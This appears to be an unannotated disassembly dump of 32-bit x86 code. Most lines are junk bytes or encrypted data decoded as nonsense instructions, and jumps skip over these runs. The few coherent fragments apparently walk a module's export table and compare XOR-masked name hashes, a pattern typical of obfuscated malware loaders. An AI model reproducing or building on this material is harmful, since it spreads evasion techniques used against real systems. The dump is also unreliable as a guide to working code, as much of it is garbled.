  40bf66:	xacquire xchg BYTE PTR [eax],cl
  40bf69:	leave  
  40bf6a:	sub    al,0x59
  40bf6c:	push   es
  40bf6d:	cmp    dh,cl
  40bf6f:	and    ah,BYTE PTR [ebx+0x4efcdc5e]
  40bf75:	pop    es
  40bf76:	push   ecx
  40bf77:	mov    bh,0xc1
  40bf79:	xchg   BYTE PTR [ebx+0x2e],dh
  40bf7c:	lds    edx,FWORD PTR [eax-0x282bb336]
  40bf82:	adc    ch,BYTE PTR [esi+esi*2+0x1ba2ac4f]
  40bf89:	push   ebp
  40bf8a:	xchg   DWORD PTR [eax],eax
  40bf8c:	mov    ebx,DWORD PTR [esi-0x713262e]
  40bf92:	(bad)  
  40bf93:	shl    BYTE PTR [ecx],1
  40bf95:	mov    cl,0xf1
  40bf97:	dec    edi
  40bf98:	pop    edx
  40bf9a:	out    dx,eax
  40bf9b:	jmp    0xd9509e15
  40bfa0:	jno    0x40bf99
  40bfa2:	jns    0x40bf35
  40bfa4:	mov    edi,0xa587878e
  40bfa9:	ffreep st(6)
  40bfab:	inc    esp
  40bfac:	jb     0x40c00e
  40bfae:	inc    ebp
  40bfaf:	js     0x40bf44
  40bfb1:	or     eax,0xc98dd9a
  40bfb6:	not    al
  40bfb8:	or     eax,0xb8922812
  40bfbd:	das    
  40bfbe:	sub    eax,0xdeabd63a
  40bfc3:	enter  0x709e,0x9e
  40bfc7:	ret    0x7452
  40bfca:	mov    ch,0x80
  40bfcc:	pop    eax
  40bfcd:	fs mov esi,cs
  40bfd0:	retf   0xa35a
  40bfd3:	ss call 0x925a418b
  40bfd9:	adc    BYTE PTR [ebp+0x24],bh
  40bfdc:	out    dx,al
  40bfdd:	cmp    al,0x84
  40bfdf:	or     eax,DWORD PTR [ebx-0x42]
  40bfe2:	jmp    0x40bfc2
  40bfe4:	push   edi
  40bfe5:	push   esi
  40bfe6:	in     eax,0x5d
  40bfe8:	in     eax,dx
  40bfe9:	mov    ecx,cs
  40bfeb:	retf   0xeebf
  40bfee:	pop    es
  40bfef:	je     0x40bf74
  40bff1:	xor    eax,0x4c0d295a
  40bff6:	push   0xd4ba39b6
  40bffb:	lods   eax,DWORD PTR ds:[esi]
  40bffc:	pop    ebp
  40bffd:	inc    eax
  40bffe:	mov    ecx,0xac278203
  40c003:	jbe    0x40c07e
  40c005:	repnz add DWORD PTR [edx+0x55],0x3f859189
  40c00d:	loope  0x40c042
  40c00f:	push   esi
  40c010:	mov    bl,0xa
  40c012:	add    eax,0x343a1a49
  40c017:	mov    ecx,0xb2bf8922
  40c01c:	pop    ebx
  40c01d:	leave  
  40c01e:	fld    st(1)
  40c020:	jle    0x40c091
  40c022:	cdq    
  40c023:	jge    0x40c043
  40c025:	outs   dx,BYTE PTR ds:[esi]
  40c026:	jl     0x40bfc3
  40c028:	call   0x67b08002
  40c02d:	adc    edx,DWORD PTR [edi-0x3e4410d8]
  40c033:	or     dh,dl
  40c035:	sbb    BYTE PTR [ecx],dl
  40c037:	xlat   BYTE PTR ds:[ebx]
  40c038:	dec    ebx
  40c039:	or     dh,BYTE PTR [ebp-0x6a]
  40c03c:	(bad)  
  40c03d:	std    
  40c03e:	mov    bh,0x58
  40c040:	es push es
  40c042:	dec    esi
  40c043:	out    0xb8,al
  40c045:	add    al,0x85
  40c047:	addr16 iret 
  40c049:	jae    0x40c06b
  40c04b:	int3   
  40c04c:	xor    DWORD PTR [edx+0x23a091b8],0xb78de5b5
  40c056:	arpl   WORD PTR [edx+0x3f1e47c8],di
  40c05c:	shl    DWORD PTR [edx-0x60],cl
  40c05f:	js     0x40bff0
  40c061:	fst    DWORD PTR ds:0x9b3f685d
  40c067:	fbld   TBYTE PTR [ecx+0x300d6e67]
  40c06d:	out    dx,eax
  40c06e:	bound  edx,QWORD PTR [ebp-0x5f06b689]
  40c074:	adc    ebp,DWORD PTR [edi-0x469b2d22]
  40c07a:	out    dx,eax
  40c07b:	call   0x2961:0xf29c7d04
  40c082:	push   ecx
  40c083:	mov    ds:0x4b92b0d6,al
  40c088:	mov    ch,0x3a
  40c08a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c08b:	out    0x51,eax
  40c08d:	xchg   edx,eax
  40c08e:	inc    esp
  40c08f:	dec    esp
  40c090:	pop    eax
  40c091:	shl    BYTE PTR [eax],1
  40c093:	stc    
  40c094:	mov    ebx,0x4803c72f
  40c099:	and    BYTE PTR [ecx+0x430642],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ef0c
  40c0a5:	mov    ds:0x430642,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43059e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e862
  40c0cb:	mov    ds:0x43059e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4305a6,0x0
  40c0dd:	mov    eax,ds:0x4305a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4305a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4305a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4305b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e876
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e9f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ebf4
  40c11d:	cmp    DWORD PTR ds:0x4305a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	and    DWORD PTR [esi-0x2cd1508],eax
  40c14c:	jle    0x40c1cc
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c192
  40c153:	pushf  
  40c154:	mov    ebx,0x3e51a86a
  40c159:	and    ebx,DWORD PTR [esi]
  40c15b:	xchg   ebp,eax
  40c15c:	inc    esi
  40c15d:	inc    edi
  40c15e:	adc    BYTE PTR [esp+eiz*4+0x6d],0x7b
  40c163:	cmp    BYTE PTR [ebx+0x4f],dh
  40c166:	cld    
  40c167:	xor    eax,0x90404065
  40c16c:	sbb    edi,edx
  40c16e:	adc    bl,dh
  40c170:	shr    edx,1
  40c172:	inc    ecx
  40c173:	or     ecx,0xf7b12e97
  40c179:	test   eax,0x9aaf7662
  40c17e:	adc    cl,BYTE PTR [ebp+0x75]
  40c181:	dec    edi
  40c182:	inc    edx
  40c183:	xchg   esp,eax
  40c184:	shr    edx,cl
  40c186:	pop    ss
  40c187:	imul   esi,ebx,0xb20f4cd0
  40c18d:	adc    edi,esp
  40c18f:	xchg   esi,eax
  40c190:	test   eax,0xbe122cbc
  40c195:	test   DWORD PTR [edx+esi*1-0x3c],0x9f4c9f2f
  40c19d:	dec    edx
  40c19e:	jp     0x40c1cf
  40c1a0:	mov    ds:0xafe28fe5,al
  40c1a5:	mov    dl,0xb1
  40c1a7:	jbe    0x40c181
  40c1a9:	mov    ch,0x64
  40c1ab:	push   ax
  40c1ad:	add    bl,BYTE PTR [eax+0x76647e0d]
  40c1b3:	dec    esi
  40c1b4:	mov    cl,dh
  40c1b6:	dec    ecx
  40c1b7:	imul   BYTE PTR [esi+0x14]
  40c1ba:	mov    edi,0xbc85de3e
  40c1bf:	pop    esp
  40c1c0:	inc    ebx
  40c1c1:	dec    ebp
  40c1c2:	and    esi,DWORD PTR [ebp+0x40]
  40c1c5:	jae    0x40c1d1
  40c1c7:	stos   BYTE PTR es:[edi],al
  40c1c8:	mov    dl,0xab
  40c1ca:	xlat   BYTE PTR ds:[ebx]
  40c1cb:	adc    al,0xc3
  40c1cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1ce:	imul   esi,edx,0xfca71837
  40c1d4:	adc    DWORD PTR [eax+0x2771986d],esi
  40c1da:	mov    bl,0xd5
  40c1dc:	and    al,0x54
  40c1de:	and    eax,0x3fe24ac9
  40c1e3:	sbb    dl,bl
  40c1e5:	xchg   edx,eax
  40c1e6:	mov    cl,0xba
  40c1e8:	out    0x2f,al
  40c1ea:	push   0xffffff96
  40c1ec:	jb     0x40c259
  40c1ee:	mov    ecx,0x88d73ada
  40c1f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c1f4:	and    edi,DWORD PTR [edx+edx*1+0x5a]
  40c1f8:	cmp    DWORD PTR ds:0x9f435240,ebp
  40c1fe:	sbb    esi,DWORD PTR [ebx+0x65]
  40c201:	rcl    BYTE PTR [eax-0x10],0xb8
  40c205:	mov    ds:0xe59c9c9,eax
  40c20a:	push   ss
  40c20b:	rol    dh,1
  40c20d:	push   edx
  40c20e:	js     0x40c26e
  40c210:	mov    eax,0x7ae8b20c
  40c215:	shl    BYTE PTR [edx+0x76],cl
  40c218:	mul    BYTE PTR [edi+0x6896b4e6]
  40c21e:	loop   0x40c1e2
  40c220:	hlt    
  40c221:	sti    
  40c222:	sub    DWORD PTR [edx+ebx*1-0x338d8341],eax
  40c229:	clc    
  40c22a:	add    cl,BYTE PTR [edi-0x4e]
  40c22d:	push   edi
  40c22e:	adc    al,bl
  40c230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c231:	jno    0x40c264
  40c233:	mov    esi,0x256e5dc3
  40c238:	loopne 0x40c1e9
  40c23a:	cs call 0x484a:0x655d2d8d
  40c242:	int3   
  40c243:	mov    BYTE PTR ds:0x8eeebf1a,ch
  40c249:	stos   BYTE PTR es:[edi],al
  40c24a:	adc    BYTE PTR [esi],0x51
  40c24d:	aam    0xa0
  40c24f:	loopne 0x40c205
  40c251:	cwde   
  40c252:	imul   esp,DWORD PTR [edi-0x2b625213],0x10
  40c259:	popa   
  40c25a:	icebp  
  40c25b:	cmp    bh,BYTE PTR [ebx]
  40c25d:	mov    cl,0xc1
  40c25f:	jnp    0x40c212
  40c261:	sub    DWORD PTR [ebx+0x790adbb7],eax
  40c267:	add    esi,DWORD PTR [ebx+0x11]
  40c26a:	and    eax,esp
  40c26c:	sbb    DWORD PTR [edi-0x4c0716e0],0x3
  40c273:	push   esp
  40c274:	adc    edi,DWORD PTR [esp+ebp*8+0x1e341f1b]
  40c27b:	xchg   ebp,eax
  40c27c:	int    0x99
  40c27e:	cli    
  40c27f:	fldenv [eax+0x4]
  40c282:	mov    ah,0xf1
  40c284:	cmp    BYTE PTR [eax],al
  40c286:	mov    bl,0xde
  40c288:	pop    edx
  40c289:	push   ss
  40c28a:	adc    eax,0xa005aed3
  40c28f:	adc    DWORD PTR [ecx+0x47],esp
  40c292:	fwait
  40c293:	mov    DWORD PTR [ebp-0x14],ecx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0xf8e92bcc,0xf36f0bcc
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c316
  40c2bd:	mov    eax,0xa108152d
  40c2c2:	cs mov dl,0x9c
  40c2c5:	mov    bh,0x93
  40c2c7:	std    
  40c2c8:	(bad)  
  40c2c9:	cmc    
  40c2ca:	aas    
  40c2cb:	ds ins DWORD PTR es:[edi],dx
  40c2cd:	pop    eax
  40c2ce:	ins    DWORD PTR es:[edi],dx
  40c2cf:	pushf  
  40c2d0:	das    
  40c2d1:	mov    edx,0x115aa510
  40c2d6:	or     al,0xe2
  40c2d8:	jle    0x40c2f5
  40c2da:	sbb    ebp,DWORD PTR [esp+eax*2]
  40c2dd:	or     al,0xd9
  40c2df:	sbb    DWORD PTR [edx+0x5f9c23fa],esi
  40c2e5:	xchg   ebp,eax
  40c2e6:	sub    eax,0x41a8e801
  40c2eb:	fist   WORD PTR [esi+0x1d]
  40c2ee:	icebp  
  40c2ef:	ret    0x82f2
  40c2f2:	pop    esp
  40c2f3:	bound  ebx,QWORD PTR [ecx+0x53]
  40c2f6:	cmc    
  40c2f7:	arpl   WORD PTR [edx+0x60],sp
  40c2fa:	dec    eax
  40c2fb:	sub    esp,DWORD PTR [ebx]
  40c2fd:	rol    BYTE PTR [ecx],1
  40c2ff:	dec    edi
  40c300:	jno    0x40c37d
  40c302:	imul   ecx,DWORD PTR [eax-0x30],0x4311e26c
  40c309:	pop    ds
  40c30a:	ja     0x40c2dd
  40c30c:	mov    WORD PTR [esi+0x7c31136a],?
  40c312:	and    dh,cl
  40c314:	into   
  40c315:	sbb    esi,DWORD PTR [eax+0x7e]
  40c318:	push   0x31
  40c31a:	data16 arpl WORD PTR [eax-0x74bd9e5c],cx
  40c321:	retf   
  40c322:	push   es
  40c323:	cli    
  40c324:	loopne 0x40c304
  40c326:	adc    cl,bl
  40c328:	xor    ebx,esi
  40c32a:	fwait
  40c32b:	inc    esp
  40c32c:	pop    eax
  40c32d:	cmp    eax,esi
  40c32f:	and    ebx,edi
  40c331:	loop   0x40c342
  40c333:	cmp    DWORD PTR [edi+edx*1-0x26],edi
  40c337:	inc    ebp
  40c338:	adc    eax,0x55f99ab6
  40c33d:	popf   
  40c33e:	push   cs
  40c33f:	(bad)
  40c344:	hlt    
  40c345:	adc    al,0xd6
  40c347:	aaa    
  40c348:	addr16 mov ch,0x45
  40c34b:	fisttp WORD PTR [esi+0x55]
  40c34e:	adc    BYTE PTR [ebx-0x1e],al
  40c351:	or     al,0xf3
  40c353:	sbb    al,0xfc
  40c355:	popf   
  40c356:	sbb    edi,DWORD PTR [eax]
  40c358:	xchg   DWORD PTR [edx-0x7a],ebx
  40c35b:	ror    DWORD PTR ds:0xa0ad2918,1
  40c361:	xchg   ebx,eax
  40c362:	xchg   edi,eax
  40c363:	test   ch,0x22
  40c366:	dec    esi
  40c367:	test   al,0x68
  40c369:	dec    ebx
  40c36a:	bound  ebp,QWORD PTR [edx]
  40c36c:	in     al,0x8a
  40c36e:	jnp    0x40c37a
  40c370:	cld    
  40c371:	(bad)  
  40c372:	sub    al,0x7e
  40c374:	mov    edi,0x10456c8
  40c379:	and    BYTE PTR [ebx+eax*1-0x3a93dec8],0xc3
  40c381:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c382:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c383:	fcom   st(3)
  40c385:	sbb    esp,DWORD PTR [edi]
  40c387:	sar    ecx,0x65
  40c38a:	xchg   esp,eax
  40c38b:	inc    esi
  40c38c:	pop    eax
  40c38d:	pushf  
  40c38e:	pop    ss
  40c38f:	out    0xbc,al
  40c391:	inc    edi
  40c392:	out    dx,eax
  40c393:	in     al,dx
  40c394:	jmp    0x40c36a
  40c396:	cmp    ebx,DWORD PTR [edi+0x77]
  40c399:	sub    al,0x61
  40c39b:	test   al,0xb8
  40c39d:	ret    
  40c39e:	repz clc 
  40c3a0:	sbb    edi,ecx
  40c3a2:	inc    DWORD PTR [ebp-0x35]
  40c3a5:	cmc    
  40c3a6:	rol    edi,1
  40c3a8:	(bad)  
  40c3a9:	pop    ebp
  40c3aa:	xor    al,0xbb
  40c3ac:	inc    esi
  40c3ad:	jecxz  0x40c411
  40c3af:	mov    ?,esp
  40c3b1:	add    esp,DWORD PTR [ecx+0x74]
  40c3b4:	and    eax,0xbeaa647b
  40c3b9:	and    al,0x91
  40c3bb:	xchg   ebx,eax
  40c3bc:	sub    DWORD PTR [ebp+0x34],esi
  40c3bf:	pop    ebx
  40c3c0:	adc    cl,BYTE PTR [edi-0x12]
  40c3c3:	aaa    
  40c3c4:	ss scas al,BYTE PTR es:[edi]
  40c3c6:	add    DWORD PTR [esi],edx
  40c3c8:	aaa    
  40c3c9:	ss mov esi,0xa8bc7feb
  40c3cf:	add    eax,0xdfe17a48
  40c3d4:	call   0x9325:0xea8105cb
  40c3db:	getsec 
  40c3dd:	push   eax
  40c3de:	cmc    
  40c3df:	sub    DWORD PTR [ebx+0x13],ebp
  40c3e2:	fsub   QWORD PTR [edi]
  40c3e4:	cdq    
  40c3e5:	ins    BYTE PTR es:[edi],dx
  40c3e6:	ret    
  40c3e7:	sbb    DWORD PTR [ecx+0x240f02c1],edx
  40c3ed:	inc    edx
  40c3ee:	int3   
  40c3ef:	shl    DWORD PTR [edx-0x24],cl
  40c3f2:	cwde   
  40c3f3:	and    edx,eax
  40c3f5:	rol    BYTE PTR [ebx],1
  40c3f7:	js     0x40c450
  40c3f9:	scas   al,BYTE PTR es:[edi]
  40c3fa:	push   ds
  40c3fb:	mov    dh,0xb8
  40c3fd:	lea    eax,[ebp-0x8]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	in     al,dx
  40c412:	test   BYTE PTR [ecx-0x79],cl
  40c415:	mov    ah,0xff
  40c417:	jle    0x40c497
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c3dc
  40c41e:	imul   bh
  40c420:	fs or  dh,dh
  40c423:	mov    edi,0x53584ce
  40c428:	add    al,al
  40c42a:	fdiv   DWORD PTR [edx+0x6c]
  40c42d:	or     al,0xb7
  40c42f:	cmp    BYTE PTR [esi+0x3d],ch
  40c432:	pop    esi
  40c433:	push   0xc2c8c40b
  40c438:	pop    edi
  40c439:	jbe    0x40c445
  40c43b:	xlat   BYTE PTR ds:[ebx]
  40c43c:	inc    ebp
  40c43d:	out    0xd5,al
  40c43f:	repz into 
  40c441:	push   ebp
  40c442:	lods   eax,DWORD PTR ds:[esi]
  40c443:	mov    ebx,0xba740a82
  40c448:	and    dh,BYTE PTR [edi-0x2f]
  40c44b:	clc    
  40c44c:	stos   DWORD PTR es:[edi],eax
  40c44d:	aas    
  40c44e:	pop    es
  40c44f:	inc    esp
  40c450:	pusha  
  40c451:	fcom   QWORD PTR [edx]
  40c453:	inc    eax
  40c454:	push   esi
  40c455:	mov    esp,0x1b96b594
  40c45a:	xor    BYTE PTR [ebx+0x44],0xbb
  40c45e:	mov    edi,0x7556b6b4
  40c463:	cmp    DWORD PTR [ebp-0x2b],edx
  40c466:	fcmovnbe st,st(4)
  40c468:	out    dx,al
  40c469:	pop    ecx
  40c46a:	(bad)  
  40c46b:	enter  0xf6f7,0x35
  40c46f:	outs   dx,DWORD PTR ds:[esi]
  40c470:	dec    ebp
  40c471:	mov    ?,WORD PTR [ebp-0x50343cd7]
  40c477:	lahf   
  40c478:	pop    edi
  40c479:	cmp    eax,0x713916ab
  40c47e:	xor    eax,0x46322d45
  40c483:	js     0x40c4cb
  40c485:	cld    
  40c486:	test   DWORD PTR [ebp-0x46],esp
  40c489:	jg     0x40c440
  40c48b:	mov    ah,0xa1
  40c48d:	cmp    BYTE PTR [ebp-0x6a8e0fcc],dh
  40c493:	cmp    BYTE PTR [ebx-0x72],bl
  40c496:	(bad)  
  40c497:	cwde   
  40c498:	sub    BYTE PTR [esi],0x8b
  40c49b:	rcl    esi,cl
  40c49d:	add    dl,cl
  40c49f:	mov    al,ds:0x706d9dfd
  40c4a4:	add    esi,DWORD PTR [esi]
  40c4a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4a7:	mov    es,WORD PTR [eax]
  40c4a9:	fisub  WORD PTR [edi]
  40c4ab:	inc    ebx
  40c4ac:	hlt    
  40c4ad:	pop    DWORD PTR [ebp+0x518961c8]
  40c4b3:	pop    ecx
  40c4b4:	mov    edx,0x6ba79e0f
  40c4b9:	aaa    
  40c4ba:	dec    ecx
  40c4bb:	adc    al,0xd8
  40c4bd:	mov    al,0xbd
  40c4bf:	adc    DWORD PTR [ebx+0x157aa6be],eax
  40c4c5:	inc    esp
  40c4c6:	pushf  
  40c4c7:	dec    eax
  40c4c8:	xchg   edi,eax
  40c4c9:	pop    esp
  40c4ca:	(bad)  
  40c4cb:	in     eax,0xee
  40c4cd:	into   
  40c4ce:	push   ecx
  40c4cf:	or     eax,0xb02c9f8d
  40c4d4:	dec    esp
  40c4d5:	push   edx
  40c4d6:	mov    edx,0x2914122e
  40c4db:	rol    ch,0xc2
  40c4de:	loop   0x40c4bc
  40c4e0:	cdq    
  40c4e1:	jne    0x40c4ac
  40c4e3:	dec    BYTE PTR [ecx+0x7359d277]
  40c4e9:	sbb    al,0x48
  40c4eb:	inc    esp
  40c4ec:	cmp    esi,ecx
  40c4ee:	dec    edx
  40c4ef:	test   ecx,0x1a9b1660
  40c4f5:	test   al,0x66
  40c4f7:	add    ebp,DWORD PTR [ecx]
  40c4f9:	add    eax,0x60c5a612
  40c4fe:	mov    ch,0x8e
  40c500:	xlat   BYTE PTR ds:[ebx]
  40c501:	push   esp
  40c502:	push   edi
  40c503:	into   
  40c504:	inc    ebp
  40c505:	mov    BYTE PTR [ebx],bh
  40c507:	fs or  eax,0xf355b653
  40c50d:	add    eax,0xca8a3400
  40c512:	sahf   
  40c513:	push   0xa3ac48af
  40c518:	vpaddusb ymm1,ymm0,YMMWORD PTR [eax-0x2a]
  40c51d:	mov    eax,0x27340f3d
  40c522:	mov    dl,0x22
  40c524:	test   eax,0xcea58cb2
  40c529:	int    0xa8
  40c52b:	xchg   ebp,eax
  40c52c:	or     DWORD PTR [edi+esi*2+0x1b],esi
  40c530:	sub    al,0x1f
  40c532:	scas   al,BYTE PTR es:[edi]
  40c533:	mov    edi,0x3bdaebd7
  40c538:	add    eax,0xa416a1e9
  40c53d:	test   BYTE PTR [edx+0x2c],dl
  40c540:	push   esp
  40c541:	mov    cl,BYTE PTR [edx+0x12]
  40c544:	das    
  40c545:	int    0x48
  40c547:	scas   al,BYTE PTR es:[di]
  40c549:	sbb    eax,0x2e84ca21
  40c54e:	pop    esp
  40c54f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c550:	call   0x80da:0x1dfc489e
  40c557:	mov    dh,0x4c
  40c559:	stc    
  40c55a:	fimul  DWORD PTR [esi+0x4d89a224]
  40c560:	rcl    BYTE PTR [eax-0x1],1
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0x80784d17
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c60b
  40c58e:	(bad)
  40c591:	xchg   ebx,eax
  40c592:	test   BYTE PTR [edx-0x1d],bh
  40c595:	or     cl,BYTE PTR [eax+ebp*8-0x76]
  40c599:	adc    dl,BYTE PTR [ecx-0x18]
  40c59c:	repnz lods eax,DWORD PTR ds:[esi]
  40c59f:	rcl    edi,0x92
  40c5a2:	sbb    al,al
  40c5a4:	pop    esi
  40c5a5:	dec    ebx
  40c5a6:	cmp    DWORD PTR [edi],0x197b53cf
  40c5ac:	enter  0xea9f,0x7a
  40c5b0:	shr    al,0xe7
  40c5b3:	add    ch,BYTE PTR [ebp-0x77a3158b]
  40c5b9:	add    DWORD PTR [ebp+0x4f],esi
  40c5bc:	mov    ds:0x8032f70a,eax
  40c5c1:	pop    ss
  40c5c2:	in     al,dx
  40c5c3:	pop    ebp
  40c5c4:	mov    al,ds:0xe57b4684
  40c5c9:	mov    ss:0x253b127d,eax
  40c5cf:	pop    ecx
  40c5d0:	inc    eax
  40c5d1:	sbb    ch,BYTE PTR [esi+0xe]
  40c5d4:	mov    eax,ds:0x28eb8e10
  40c5d9:	xor    BYTE PTR [ebp+0x35],0x10
  40c5dd:	and    bl,BYTE PTR [eax+0xf41b703]
  40c5e3:	rcl    BYTE PTR [ecx],cl
  40c5e5:	(bad)  
  40c5e6:	pop    ss
  40c5e7:	rcl    DWORD PTR [ecx+0x6f],1
  40c5ea:	xor    al,0xc3
  40c5ec:	xor    BYTE PTR [eax],bl
  40c5ee:	cmp    eax,0xea6a679d
  40c5f3:	ja     0x40c5ab
  40c5f5:	shr    DWORD PTR [ebx+0x719ae4d1],1
  40c5fb:	ins    BYTE PTR es:[edi],dx
  40c5fc:	xor    DWORD PTR [eax+0x38],esi
  40c5ff:	int3   
  40c600:	in     al,0x52
  40c602:	cmp    al,0x46
  40c604:	mov    ebx,0x2ed1210e
  40c609:	arpl   cx,si
  40c60b:	dec    ebp
  40c60c:	sub    BYTE PTR [esi-0x75],ah
  40c60f:	retf   
  40c610:	loop   0x40c5cd
  40c612:	aas    
  40c613:	mov    eax,ds:0x35f5c43e
  40c618:	sub    BYTE PTR [edi+0x44],bh
  40c61b:	mov    eax,DWORD PTR [eax-0x34]
  40c61e:	mov    ds:0xa53461b0,al
  40c623:	xchg   ebp,eax
  40c624:	inc    edi
  40c625:	out    dx,eax
  40c626:	fisubr WORD PTR ds:0x8fcd0e59
  40c62c:	mov    ebp,0x7a15dd46
  40c631:	lock and ebx,DWORD PTR fs:[ecx-0x27cf2b59]
  40c639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c63a:	scas   al,BYTE PTR es:[edi]
  40c63b:	fwait
  40c63c:	or     DWORD PTR [edi],edi
  40c63e:	sub    edi,esi
  40c640:	xchg   esi,eax
  40c641:	add    BYTE PTR [eax+0x4c],bh
  40c644:	dec    ebp
  40c645:	out    0xb,eax
  40c647:	fsub   st,st(4)
  40c649:	popa   
  40c64a:	xchg   esi,eax
  40c64b:	mov    ch,0x5b
  40c64d:	lods   al,BYTE PTR ds:[esi]
  40c64e:	adc    al,0x66
  40c650:	xchg   ebx,eax
  40c651:	sbb    DWORD PTR [ebp-0x3],esp
  40c654:	test   al,0x8e
  40c656:	icebp  
  40c657:	imul   eax,eax,0x600519bc
  40c65d:	fdivp  st(6),st
  40c65f:	ja     0x40c62e
  40c661:	jbe    0x40c5fe
  40c663:	cmp    BYTE PTR [edi],ah
  40c665:	mov    eax,0x3a84b056
  40c66a:	push   esp
  40c66b:	loop   0x40c68f
  40c66d:	or     DWORD PTR [ecx+0x48],0x663c6bef
  40c674:	test   al,0x6d
  40c676:	pop    ebp
  40c677:	lods   eax,DWORD PTR ds:[esi]
  40c678:	std    
  40c679:	inc    ebp
  40c67a:	and    al,0xb5
  40c67c:	adc    eax,0x1181caca
  40c681:	inc    ebp
  40c682:	push   ds
  40c683:	mov    ah,0xef
  40c685:	js     0x40c624
  40c687:	into   
  40c688:	jb     0x40c6bd
  40c68a:	dec    esp
  40c68b:	and    BYTE PTR [edx],al
  40c68d:	test   DWORD PTR [edx-0x35],esi
  40c690:	ja     0x40c683
  40c692:	dec    esp
  40c693:	xlat   BYTE PTR ds:[ebx]
  40c694:	out    dx,al
  40c695:	mov    edx,0xc6cb7d1
  40c69a:	data16 ja 0x40c6df
  40c69d:	sbb    ah,BYTE PTR es:[ebp-0x4c8d5ad0]
  40c6a4:	loope  0x40c6aa
  40c6a6:	ror    BYTE PTR [esi+esi*2],1
  40c6a9:	or     BYTE PTR [ebp-0x6e660beb],0x9
  40c6b0:	fmul   st,st(1)
  40c6b2:	xchg   esi,eax
  40c6b3:	loope  0x40c64a
  40c6b5:	ret    
  40c6b6:	mov    DWORD PTR [esi+ecx*2],edx
  40c6b9:	push   0xffffffe0
  40c6bb:	in     eax,0x50
  40c6bd:	mov    eax,ds:0x4525f46c
  40c6c2:	jns    0x40c708
  40c6c4:	cld    
  40c6c5:	push   es
  40c6c6:	mov    bl,0xcb
  40c6c8:	stos   DWORD PTR es:[edi],eax
  40c6c9:	inc    esp
  40c6ca:	mov    bh,0x9
  40c6cc:	or     eax,0xf84d8bb2
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
